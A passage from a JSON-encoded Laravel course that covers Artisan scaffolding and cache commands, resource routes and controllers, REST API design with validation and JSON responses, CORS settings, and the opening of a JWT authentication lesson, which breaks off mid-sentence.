prefix."},{"kind":"code","lang":"bash","code":"php artisan serve --port=8888      # start dev server\nphp artisan tinker                 # open an interactive REPL\nphp artisan route:clear            # clear cached routes\nphp artisan config:clear           # clear cached config\nphp artisan cache:clear            # clear application cache"},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003ePitfall:\u003c/strong\u003e Artisan commands use \u003cstrong\u003ecolon\u003c/strong\u003e syntax — \u003ccode\u003emake:migration\u003c/code\u003e, \u003ccode\u003emake:controller\u003c/code\u003e, \u003ccode\u003emake:model\u003c/code\u003e. The hyphen form (\u003ccode\u003emake-migration\u003c/code\u003e) does not exist. This was tested directly in final-practice.docx Q6: option (c) \u003ccode\u003ephp artisan make-migration user-table\u003c/code\u003e is wrong; option (b) \u003ccode\u003ephp artisan make:migration user-table\u003c/code\u003e is correct.\u003c/p\u003e\n\u003c/blockquote\u003e"},{"kind":"h2","html":"The \u003ccode\u003emake:\u003c/code\u003e family — scaffolding commands","text":"The `make:` family — scaffolding commands"},{"kind":"p","html":"The most-used Artisan commands are the \u003ccode\u003emake:\u003c/code\u003e generators. They create skeleton files so you never start from a blank page.","text":"The most-used Artisan commands are the `make:` generators. They create skeleton files so you never start from a blank page."},{"kind":"code","lang":"bash","code":"php artisan make:model Student -m          # model + migration in one step\nphp artisan make:controller StudentsController --resource\nphp artisan make:migration create_students_table\nphp artisan make:seeder StudentSeeder"},{"kind":"p","html":"The \u003ccode\u003e-m\u003c/code\u003e flag on \u003ccode\u003emake:model\u003c/code\u003e is a shortcut: it generates both the model file and its matching migration in a single command. Without \u003ccode\u003e-m\u003c/code\u003e, you would need two separate commands.","text":"The `-m` flag on `make:model` is a shortcut: it generates both the model file and its matching migration in a single command. Without `-m`, you would need two separate commands."},{"kind":"p","html":"\u003ccode\u003e--resource\u003c/code\u003e on \u003ccode\u003emake:controller\u003c/code\u003e scaffolds all seven RESTful methods: \u003ccode\u003eindex\u003c/code\u003e, \u003ccode\u003ecreate\u003c/code\u003e, \u003ccode\u003estore\u003c/code\u003e, \u003ccode\u003eshow\u003c/code\u003e, \u003ccode\u003eedit\u003c/code\u003e, \u003ccode\u003eupdate\u003c/code\u003e, and \u003ccode\u003edestroy\u003c/code\u003e.","text":"`--resource` on `make:controller` scaffolds all seven RESTful methods: `index`, `create`, `store`, `show`, `edit`, `update`, and `destroy`."},{"kind":"checkpoint","q":"What is the single command that creates a model and its database migration at the same time?","a":"`php artisan make:model ModelName -m` — the `-m` flag generates the migration alongside the model."},{"kind":"h2","html":"Cache-clearing commands","text":"Cache-clearing commands"},{"kind":"p","html":"Laravel caches routes, config, and compiled views to speed up production. During development, stale caches cause confusing bugs. Clear them with:","text":"Laravel caches routes, config, and compiled views to speed up production. During development, stale caches cause confusing bugs. Clear them with:"},{"kind":"code","lang":"bash","code":"php artisan route:clear\nphp artisan config:clear\nphp artisan cache:clear"},{"kind":"p","html":"Run these any time a config change or route addition does not seem to take effect.","text":"Run these any time a config change or route addition does not seem to take effect."},{"kind":"h2","html":"Tinker — test your models interactively","text":"Tinker — test your models interactively"},{"kind":"p","html":"\u003ccode\u003ephp artisan tinker\u003c/code\u003e opens a REPL (Read-Eval-Print Loop) that boots Laravel fully. You can query your database, create records, and test Eloquent methods without writing a controller.","text":"`php artisan tinker` opens a REPL (Read-Eval-Print Loop) that boots Laravel fully. You can query your database, create records, and test Eloquent methods without writing a controller."},{"kind":"code","lang":"bash","code":"php artisan tinker\n\u003e\u003e\u003e \\App\\Models\\Student::all()\n\u003e\u003e\u003e \\App\\Models\\Student::find(1)"},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003ePitfall:\u003c/strong\u003e Every \u003ccode\u003emake:\u003c/code\u003e command uses a \u003cstrong\u003ecolon\u003c/strong\u003e separator — \u003ccode\u003emake:model\u003c/code\u003e, \u003ccode\u003emake:controller\u003c/code\u003e, \u003ccode\u003emake:migration\u003c/code\u003e. The hyphen form (\u003ccode\u003emake-migration\u003c/code\u003e) does not exist. \u003ccode\u003efinal-practice.docx Q6\u003c/code\u003e used the hyphen form as a direct distractor.\u003c/p\u003e\n\u003c/blockquote\u003e"},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eTakeaway:\u003c/strong\u003e Composer creates the project and manages packages. Artisan scaffolds files, runs the server, and manages the app lifecycle. Know the colon syntax for every \u003ccode\u003emake:\u003c/code\u003e command — the exam tests it directly — and reach for \u003ccode\u003etinker\u003c/code\u003e whenever you need to verify Eloquent behavior without a browser.\u003c/p\u003e\n\u003c/blockquote\u003e"}]},{"n":7,"id":"laravel-routing-controllers","title":"Routes and resource controllers","hook":"One line of config replaces five route declarations — here's what Route::resource() buys you and where it can bite you.","tags":["laravel","routing","controllers","resource-routes","middleware"],"module":"Laravel Foundations","source":"laravel_with_sqlite_API_SCRIPT.docx; intro_to_laravel_SCRIPT.docx","blocks":[{"kind":"h2","html":"Start here: one line, five routes","text":"Start here: one line, five routes"},{"kind":"p","html":"You have a \u003ccode\u003eStudentsController\u003c/code\u003e with five methods. Without resource routing, your \u003ccode\u003eroutes/api.php\u003c/code\u003e looks like this:","text":"You have a `StudentsController` with five methods. Without resource routing, your `routes/api.php` looks like this:"},{"kind":"code","lang":"php","code":"Route::get('students', [StudentsController::class, 'index']);\nRoute::get('students/{student}', [StudentsController::class, 'show']);\nRoute::post('students', [StudentsController::class, 'store']);\nRoute::put('students/{student}', [StudentsController::class, 'update']);\nRoute::delete('students/{student}', [StudentsController::class, 'destroy']);"},{"kind":"p","html":"Replace all five lines with one resource route:","text":"Replace all five lines with one resource route:"},{"kind":"code","lang":"php","code":"Route::apiResource('students', StudentsController::class);"},{"kind":"p","html":"Laravel generates the same five HTTP-to-method bindings automatically. You write less; the framework does more.","text":"Laravel generates the same five HTTP-to-method bindings automatically. You write less; the framework does more."},{"kind":"h2","html":"routes/web.php vs routes/api.php","text":"routes/web.php vs routes/api.php"},{"kind":"p","html":"Laravel keeps two route files for different purposes.","text":"Laravel keeps two route files for different purposes."},{"kind":"p","html":"\u003ccode\u003eroutes/web.php\u003c/code\u003e handles browser-facing requests. It applies session state, CSRF protection, and redirects users to login pages when authentication fails.","text":"`routes/web.php` handles browser-facing requests. It applies session state, CSRF protection, and redirects users to login pages when authentication fails."},{"kind":"p","html":"\u003ccode\u003eroutes/api.php\u003c/code\u003e handles stateless API requests. It returns JSON, uses token-based authentication, and prefixes every URL with \u003ccode\u003e/api/\u003c/code\u003e automatically. You generate this file with:","text":"`routes/api.php` handles stateless API requests. It returns JSON, uses token-based authentication, and prefixes every URL with `/api/` automatically. You generate this file with:"},{"kind":"code","lang":"bash","code":"php artisan install:api"},{"kind":"p","html":"Put your \u003ccode\u003eRoute::resource()\u003c/code\u003e and \u003ccode\u003eRoute::apiResource()\u003c/code\u003e calls in \u003ccode\u003eroutes/api.php\u003c/code\u003e for REST APIs.","text":"Put your `Route::resource()` and `Route::apiResource()` calls in `routes/api.php` for REST APIs."},{"kind":"h2","html":"Route::resource() vs Route::apiResource()","text":"Route::resource() vs Route::apiResource()"},{"kind":"p","html":"Both macros map HTTP verbs to controller methods. They differ in which methods they include.","text":"Both macros map HTTP verbs to controller methods. They differ in which methods they include."},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eMacro\u003c/th\u003e\n\u003cth\u003eMethods registered\u003c/th\u003e\n\u003cth\u003eUse case\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eRoute::resource()\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eAll 7 (index, create, store, show, edit, update, destroy)\u003c/td\u003e\n\u003ctd\u003eWeb apps with HTML forms\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eRoute::apiResource()\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e5 (index, store, show, update, destroy)\u003c/td\u003e\n\u003ctd\u003eJSON APIs — no \u003ccode\u003ecreate\u003c/code\u003e or \u003ccode\u003eedit\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"p","html":"\u003ccode\u003ecreate\u003c/code\u003e and \u003ccode\u003eedit\u003c/code\u003e exist only to return HTML forms. A JSON API never needs them, so \u003ccode\u003eRoute::apiResource()\u003c/code\u003e drops them.","text":"`create` and `edit` exist only to return HTML forms. A JSON API never needs them, so `Route::apiResource()` drops them."},{"kind":"checkpoint","q":"You're building a JSON API. Which resource macro should you use, and why are two methods omitted?","a":"Use `Route::apiResource()`. It omits `create` (returns the \"new item\" HTML form) and `edit` (returns the \"edit item\" HTML form) — neither exists in a stateless API."},{"kind":"h2","html":"The 7 RESTful controller methods","text":"The 7 RESTful controller methods"},{"kind":"p","html":"When you scaffold a resource controller, Laravel generates these seven method stubs:","text":"When you scaffold a resource controller, Laravel generates these seven method stubs:"},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eHTTP verb\u003c/th\u003e\n\u003cth\u003eURL\u003c/th\u003e\n\u003cth\u003eController method\u003c/th\u003e\n\u003cth\u003ePurpose\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003eGET\u003c/td\u003e\n\u003ctd\u003e/students\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003eindex()\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eList all records\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eGET\u003c/td\u003e\n\u003ctd\u003e/students/create\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003ecreate()\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eReturn HTML create form\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ePOST\u003c/td\u003e\n\u003ctd\u003e/students\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003estore()\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003ePersist a new record\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eGET\u003c/td\u003e\n\u003ctd\u003e/students/{student}\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003eshow()\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eReturn one record\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eGET\u003c/td\u003e\n\u003ctd\u003e/students/{student}/edit\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003eedit()\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eReturn HTML edit form\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ePUT/PATCH\u003c/td\u003e\n\u003ctd\u003e/students/{student}\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003eupdate()\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eUpdate an existing record\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eDELETE\u003c/td\u003e\n\u003ctd\u003e/students/{student}\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003edestroy()\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eDelete a record\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"p","html":"Scaffold a resource controller with the \u003ccode\u003e--api\u003c/code\u003e flag to skip the \u003ccode\u003ecreate\u003c/code\u003e and \u003ccode\u003eedit\u003c/code\u003e stubs entirely:","text":"Scaffold a resource controller with the `--api` flag to skip the `create` and `edit` stubs entirely:"},{"kind":"code","lang":"bash","code":"php artisan make:controller api/StudentsController --api --model=Student"},{"kind":"h2","html":"Restricting generated routes","text":"Restricting generated routes"},{"kind":"p","html":"You rarely need all five API routes. Use \u003ccode\u003e-&gt;only()\u003c/code\u003e to whitelist the ones you want:","text":"You rarely need all five API routes. Use `-\u003eonly()` to whitelist the ones you want:"},{"kind":"code","lang":"php","code":"Route::apiResource('students', StudentsController::class)\n    -\u003eonly(['index', 'show', 'store', 'update', 'destroy']);"},{"kind":"p","html":"This prevents Laravel from registering routes you have no controller logic for.","text":"This prevents Laravel from registering routes you have no controller logic for."},{"kind":"h2","html":"Middleware chaining","text":"Middleware chaining"},{"kind":"p","html":"To protect a resource route with authentication, chain \u003ccode\u003e-&gt;middleware()\u003c/code\u003e onto the registration:","text":"To protect a resource route with authentication, chain `-\u003emiddleware()` onto the registration:"},{"kind":"code","lang":"php","code":"Route::apiResource('students', StudentsController::class)\n    -\u003emiddleware(['auth:sanctum']);"},{"kind":"p","html":"You can stack multiple middleware in the array. Laravel runs them in order before the request reaches your controller.","text":"You can stack multiple middleware in the array. Laravel runs them in order before the request reaches your controller."},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003ePitfall:\u003c/strong\u003e After adding \u003ccode\u003e-&gt;middleware([&#39;auth:sanctum&#39;])\u003c/code\u003e to a route, the route may still appear unprotected if you have a route cache from before the change. Run \u003ccode\u003ephp artisan route:clear\u003c/code\u003e after every routing change. A stale cache silently serves the old route table.\u003c/p\u003e\n\u003c/blockquote\u003e"},{"kind":"h2","html":"Route caching","text":"Route caching"},{"kind":"p","html":"Route registration has a small overhead. In production, cache all routes to a single file:","text":"Route registration has a small overhead. In production, cache all routes to a single file:"},{"kind":"code","lang":"bash","code":"php artisan route:cache"},{"kind":"p","html":"To clear and rebuild the cache after changes:","text":"To clear and rebuild the cache after changes:"},{"kind":"code","lang":"bash","code":"php artisan route:clear"},{"kind":"p","html":"During local development, skip caching — it prevents newly defined routes from loading. Use \u003ccode\u003ephp artisan route:clear\u003c/code\u003e any time routes behave unexpectedly.","text":"During local development, skip caching — it prevents newly defined routes from loading. Use `php artisan route:clear` any time routes behave unexpectedly."},{"kind":"checkpoint","q":"You add a new resource route in `routes/api.php` and start the server, but hitting `/api/items` returns a 404. What is the most likely cause?","a":"A stale route cache. Run `php artisan route:clear` to discard it, then retry."},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003ePitfall:\u003c/strong\u003e After adding or editing a route, a stale \u003ccode\u003eroute:cache\u003c/code\u003e from a previous \u003ccode\u003ephp artisan route:cache\u003c/code\u003e call will shadow your changes — your new route returns 404 even though the code is correct. Always run \u003ccode\u003ephp artisan route:clear\u003c/code\u003e after any routing change in development.\u003c/p\u003e\n\u003c/blockquote\u003e"},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eTakeaway:\u003c/strong\u003e \u003ccode\u003eRoute::apiResource()\u003c/code\u003e replaces five manual route declarations with one. It binds HTTP verbs to controller methods by convention, so your \u003ccode\u003eroutes/api.php\u003c/code\u003e stays short and readable. Always clear the route cache after structural routing changes — a stale cache is the single most common source of &quot;my route doesn&#39;t exist&quot; bugs in Laravel.\u003c/p\u003e\n\u003c/blockquote\u003e"}]},{"n":8,"id":"rest-api-design","title":"REST API design in Laravel","hook":"Route::apiResource() wires five HTTP verbs to five controller methods in one line — here's everything that has to be true for that to work.","tags":["rest","api","json","http-methods","laravel"],"module":"API and Authentication","source":"laravel_with_sqlite_API_SCRIPT.docx","blocks":[{"kind":"h2","html":"A working endpoint before the theory","text":"A working endpoint before the theory"},{"kind":"p","html":"Here is a complete \u003ccode\u003estore()\u003c/code\u003e method that accepts a POST request, validates the body, creates a record, and returns a 201 response:","text":"Here is a complete `store()` method that accepts a POST request, validates the body, creates a record, and returns a 201 response:"},{"kind":"code","lang":"php","code":"public function store(Request $request)\n{\n    $request-\u003evalidate([\n        'FirstName' =\u003e 'required',\n        'LastName'  =\u003e 'required',\n        'School'    =\u003e 'required',\n    ]);\n\n    $student = Student::create([\n        'FirstName' =\u003e request('FirstName'),\n        'LastName'  =\u003e request('LastName'),\n        'School'    =\u003e request('School'),\n    ]);\n\n    return response()-\u003ejson($student, 201);\n}"},{"kind":"p","html":"Every line in that method maps to a REST concept. The sections below explain each one.","text":"Every line in that method maps to a REST concept. The sections below explain each one."},{"kind":"h2","html":"HTTP verbs and the controller methods they map to","text":"HTTP verbs and the controller methods they map to"},{"kind":"p","html":"REST APIs use HTTP verbs to express intent. Laravel&#39;s resource controller scaffolds one method per verb:","text":"REST APIs use HTTP verbs to express intent. Laravel's resource controller scaffolds one method per verb:"},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eHTTP verb\u003c/th\u003e\n\u003cth\u003eController method\u003c/th\u003e\n\u003cth\u003eWhat it does\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003eGET /students\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003eindex()\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eReturn all records\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eGET /students/{id}\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003eshow()\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eReturn one record\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ePOST /students\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003estore()\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eCreate a new record\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ePUT /students/{id}\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003eupdate()\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eReplace a record\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eDELETE /students/{id}\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003edestroy()\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eRemove a record\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"p","html":"You register all five routes with a single declaration in \u003ccode\u003eroutes/api.php\u003c/code\u003e:","text":"You register all five routes with a single declaration in `routes/api.php`:"},{"kind":"code","lang":"php","code":"Route::resource('students', StudentsController::class);"},{"kind":"p","html":"You create the controller skeleton with:","text":"You create the controller skeleton with:"},{"kind":"code","lang":"bash","code":"php artisan make:controller api/StudentsController --api --model=Student"},{"kind":"p","html":"The \u003ccode\u003e--api\u003c/code\u003e flag omits \u003ccode\u003ecreate()\u003c/code\u003e and \u003ccode\u003eedit()\u003c/code\u003e (those render HTML forms — not needed for a JSON API). The \u003ccode\u003e--model=Student\u003c/code\u003e flag injects route-model binding automatically.","text":"The `--api` flag omits `create()` and `edit()` (those render HTML forms — not needed for a JSON API). The `--model=Student` flag injects route-model binding automatically."},{"kind":"checkpoint","q":"What single Artisan command creates an API resource controller bound to the Student model?","a":"`php artisan make:controller api/StudentsController --api --model=Student`"},{"kind":"h2","html":"JSON responses with response()-&gt;json()","text":"JSON responses with response()-\u003ejson()"},{"kind":"p","html":"Controllers in a JSON API must return JSON, not HTML. Use \u003ccode\u003eresponse()-&gt;json()\u003c/code\u003e:","text":"Controllers in a JSON API must return JSON, not HTML. Use `response()-\u003ejson()`:"},{"kind":"code","lang":"php","code":"// 200 OK (default)\nreturn response()-\u003ejson($student);\n\n// 201 Created (new resource)\nreturn response()-\u003ejson($student, 201);\n\n// 404 Not Found (explicit check)\nreturn response()-\u003ejson(['message' =\u003e 'Student not found'], 404);"},{"kind":"p","html":"The second argument is the HTTP status code. Omitting it defaults to 200. For a successful \u003ccode\u003estore()\u003c/code\u003e, always return 201 — it signals that a resource was created, not merely retrieved.","text":"The second argument is the HTTP status code. Omitting it defaults to 200. For a successful `store()`, always return 201 — it signals that a resource was created, not merely retrieved."},{"kind":"checkpoint","q":"Which HTTP status code should `store()` return on success, and how do you set it with `response()-\u003ejson()`?","a":"201 — pass it as the second argument: `response()-\u003ejson($student, 201)`."},{"kind":"h2","html":"Request validation with $request-&gt;validate()","text":"Request validation with $request-\u003evalidate()"},{"kind":"p","html":"Never trust incoming data. Call \u003ccode\u003e$request-&gt;validate()\u003c/code\u003e (or equivalently \u003ccode\u003erequest()-&gt;validate()\u003c/code\u003e) at the top of \u003ccode\u003estore()\u003c/code\u003e and \u003ccode\u003eupdate()\u003c/code\u003e:","text":"Never trust incoming data. Call `$request-\u003evalidate()` (or equivalently `request()-\u003evalidate()`) at the top of `store()` and `update()`:"},{"kind":"code","lang":"php","code":"$request-\u003evalidate([\n    'FirstName' =\u003e 'required',\n    'LastName'  =\u003e 'required',\n    'School'    =\u003e 'required',\n]);"},{"kind":"p","html":"If any rule fails, Laravel automatically returns a 422 Unprocessable Entity response with a JSON error body — no extra code required. Execution stops before \u003ccode\u003eStudent::create()\u003c/code\u003e is reached, so invalid data never hits the database.","text":"If any rule fails, Laravel automatically returns a 422 Unprocessable Entity response with a JSON error body — no extra code required. Execution stops before `Student::create()` is reached, so invalid data never hits the database."},{"kind":"h2","html":"findOrFail() for 404 handling","text":"findOrFail() for 404 handling"},{"kind":"p","html":"When a route includes \u003ccode\u003e{id}\u003c/code\u003e, you need to handle the case where the record does not exist. \u003ccode\u003efindOrFail()\u003c/code\u003e does this in one call:","text":"When a route includes `{id}`, you need to handle the case where the record does not exist. `findOrFail()` does this in one call:"},{"kind":"code","lang":"php","code":"public function show($id)\n{\n    $student = Student::findOrFail($id);\n    return response()-\u003ejson($student);\n}"},{"kind":"p","html":"\u003ccode\u003efindOrFail()\u003c/code\u003e returns the model if it exists, or throws a \u003ccode\u003eModelNotFoundException\u003c/code\u003e that Laravel converts to a 404 response. The alternative — \u003ccode\u003eStudent::find($id)\u003c/code\u003e followed by a manual \u003ccode\u003eif (!$student)\u003c/code\u003e check — produces the same result but is more verbose. The source code also shows the manual pattern as an intermediate step:","text":"`findOrFail()` returns the model if it exists, or throws a `ModelNotFoundException` that Laravel converts to a 404 response. The alternative — `Student::find($id)` followed by a manual `if (!$student)` check — produces the same result but is more verbose. The source code also shows the manual pattern as an intermediate step:"},{"kind":"code","lang":"php","code":"$student = Student::find($id);\nif (!$student) {\n    return response()-\u003ejson(['message' =\u003e 'Student not found'], 404);\n}"},{"kind":"p","html":"Both patterns are correct; \u003ccode\u003efindOrFail()\u003c/code\u003e is the idiomatic choice.","text":"Both patterns are correct; `findOrFail()` is the idiomatic choice."},{"kind":"checkpoint","q":"What does `findOrFail($id)` do when the record is not found?","a":"It throws a ModelNotFoundException, which Laravel converts to a 404 JSON response."},{"kind":"h2","html":"$fillable and mass assignment protection","text":"$fillable and mass assignment protection"},{"kind":"p","html":"\u003ccode\u003eStudent::create([...])\u003c/code\u003e uses mass assignment — setting multiple attributes at once from an array. Laravel blocks this by default unless the model declares which fields are safe:","text":"`Student::create([...])` uses mass assignment — setting multiple attributes at once from an array. Laravel blocks this by default unless the model declares which fields are safe:"},{"kind":"code","lang":"php","code":"// app/Models/Student.php\nprotected $fillable = [\n    'FirstName',\n    'LastName',\n    'School',\n];"},{"kind":"p","html":"Without \u003ccode\u003e$fillable\u003c/code\u003e, calling \u003ccode\u003eStudent::create()\u003c/code\u003e throws a \u003ccode\u003eMassAssignmentException\u003c/code\u003e. The model acts as a whitelist: only listed attributes can be set via \u003ccode\u003ecreate()\u003c/code\u003e or \u003ccode\u003efill()\u003c/code\u003e.","text":"Without `$fillable`, calling `Student::create()` throws a `MassAssignmentException`. The model acts as a whitelist: only listed attributes can be set via `create()` or `fill()`."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eForgetting \u003ccode\u003e$fillable\u003c/code\u003e is the most common reason \u003ccode\u003estore()\u003c/code\u003e crashes with a \u003ccode\u003eMassAssignmentException\u003c/code\u003e. The controller code looks correct but the model is missing the whitelist. Always add \u003ccode\u003e$fillable\u003c/code\u003e to any model used with \u003ccode\u003ecreate()\u003c/code\u003e or \u003ccode\u003efill()\u003c/code\u003e.\u003c/p\u003e","text":"Forgetting `$fillable` is the most common reason `store()` crashes with a `MassAssignmentException`. The controller code looks correct but the model is missing the whitelist. Always add `$fillable` to any model used with `create()` or `fill()`."},{"kind":"h2","html":"CORS","text":"CORS"},{"kind":"p","html":"CORS (cross-origin resource sharing) is the browser policy that controls whether JavaScript on one domain can call an API on another. By default, Laravel enables CORS for all HTTP methods using the \u003ccode\u003e&quot;*&quot;\u003c/code\u003e wildcard. The configuration lives in \u003ccode\u003econfig/cors.php\u003c/code\u003e.","text":"CORS (cross-origin resource sharing) is the browser policy that controls whether JavaScript on one domain can call an API on another. By default, Laravel enables CORS for all HTTP methods using the `\"*\"` wildcard. The configuration lives in `config/cors.php`."},{"kind":"p","html":"For a simple API accessed from the same origin or during development, the defaults work without changes. If your front end is on a different domain or uses credentials (cookies, Authorization headers), update \u003ccode\u003econfig/cors.php\u003c/code\u003e — particularly the \u003ccode\u003eallowed_origins\u003c/code\u003e and \u003ccode\u003esupports_credentials\u003c/code\u003e values.","text":"For a simple API accessed from the same origin or during development, the defaults work without changes. If your front end is on a different domain or uses credentials (cookies, Authorization headers), update `config/cors.php` — particularly the `allowed_origins` and `supports_credentials` values."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eAfter changing \u003ccode\u003econfig/cors.php\u003c/code\u003e, you must clear the route and config caches for the change to take effect:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003ephp artisan route:clear\nphp artisan config:clear\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eForgetting this step means your CORS changes are silently ignored.\u003c/p\u003e","text":"After changing `config/cors.php`, you must clear the route and config caches for the change to take effect:\n```bash\nphp artisan route:clear\nphp artisan config:clear\n```\nForgetting this step means your CORS changes are silently ignored."},{"kind":"h2","html":"Putting it together — the full flow","text":"Putting it together — the full flow"},{"kind":"mermaid","source":"flowchart LR\n    A[\"POST /api/students\\n(JSON body)\"] --\u003e B[\"Route::resource()\\nroutes/api.php\"]\n    B --\u003e C[\"store(Request $request)\\nStudentsController\"]\n    C --\u003e D[\"$request-\u003evalidate()\\n422 on failure\"]\n    D --\u003e E[\"Student::create()\\n$fillable required\"]\n    E --\u003e F[\"response()-\u003ejson($student, 201)\"]"},{"kind":"p","html":"The route declaration dispatches the request. The controller validates it. Eloquent creates the record. The response wraps the result in JSON with the correct status code.","text":"The route declaration dispatches the request. The controller validates it. Eloquent creates the record. The response wraps the result in JSON with the correct status code."},{"kind":"callout","variant":"takeaway","html":"\u003cp\u003eREST API design in Laravel is the combination of five pieces working together: \u003ccode\u003eRoute::resource()\u003c/code\u003e maps verbs to methods, \u003ccode\u003e$request-&gt;validate()\u003c/code\u003e rejects bad input before it reaches the database, \u003ccode\u003e$fillable\u003c/code\u003e allows mass assignment, \u003ccode\u003efindOrFail()\u003c/code\u003e converts missing records to 404s, and \u003ccode\u003eresponse()-&gt;json()\u003c/code\u003e wraps every response in JSON with an explicit status code. Get one piece wrong and the API either crashes, silently accepts garbage data, or returns the wrong status.\u003c/p\u003e","text":"REST API design in Laravel is the combination of five pieces working together: `Route::resource()` maps verbs to methods, `$request-\u003evalidate()` rejects bad input before it reaches the database, `$fillable` allows mass assignment, `findOrFail()` converts missing records to 404s, and `response()-\u003ejson()` wraps every response in JSON with an explicit status code. Get one piece wrong and the API either crashes, silently accepts garbage data, or returns the wrong status."}]},{"n":9,"id":"jwt-authentication","title":"JWT authentication — stateless API security","hook":"A token your server signs once and never stores — here's how that actually works.","tags":["jwt","authentication","bearer-token","laravel","api"],"module":"API and Authentication","source":"PHP_JWT.pptx; laravel-jwt_SCRIPT.docx","blocks":[{"kind":"h2","html":"The problem sessions can&#39;t solve","text":"The problem sessions can't solve"},{"kind":"p","html":"You have a Laravel REST API. A mobile app calls it. A third-party service calls it. Neither has a browser session — they can&#39;t store a session cookie. You need a way to prove identity on every request without looking up a database record each time.","text":"You have a Laravel REST API. A mobile app calls it. A third-party service calls it. Neither has a browser session — they can't store a session cookie. You need a way to prove identity on every request without looking up a database record each time."},{"kind":"p","html":"Here is what actually happens when you log in with JWT:","text":"Here is what actually happens when you log in with JWT:"},{"kind":"p","html":"\u003col\u003e\n\u003cli\u003eClient sends credentials (email + password) to \u003ccode\u003ePOST /api/login\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eServer checks the credentials.\u003c/li\u003e\n\u003cli\u003eServer creates a JWT token and signs it with a secret key.\u003c/li\u003e\n\u003cli\u003eServer sends the token back to the client.\u003c/li\u003e\n\u003cli\u003eClient stores the token (typically in localStorage) and attaches it to every future request.\u003c/li\u003e\n\u003cli\u003eServer verifies the token&#39;s signature on every subsequent request.\u003c/li\u003e\n\u003cli\u003eIf the token is valid, the server responds; if not, it returns 401 Unauthorized.\u003c/li\u003e\n\u003c/ol\u003e","text":"1. Client sends credentials (email + password) to `POST /api/login`.\n2. Server checks the credentials.\n3. Server creates a JWT token and signs it with a secret key.\n4. Server sends the token back to the client.\n5. Client stores the token (typically in localStorage) and attaches it to every future request.\n6. Server verifies the token's signature on every subsequent request.\n7. If the token is valid, the server responds; if not, it returns 401 Unauthorized."},{"kind":"p","html":"That is the full loop. No session table. No cookie. The token carries its own proof of authenticity.","text":"That is the full loop. No session table. No cookie. The token carries its own proof of authenticity."},{"kind":"checkpoint","q":"What does the server check on every request after the initial login?","a":"The token's signature — if the signature is valid and the token hasn't expired, the request is allowed through."},{"kind":"h2","html":"JWT structure: three parts, all base64","text":"JWT structure: three parts, all base64"},{"kind":"p","html":"A JWT token looks like 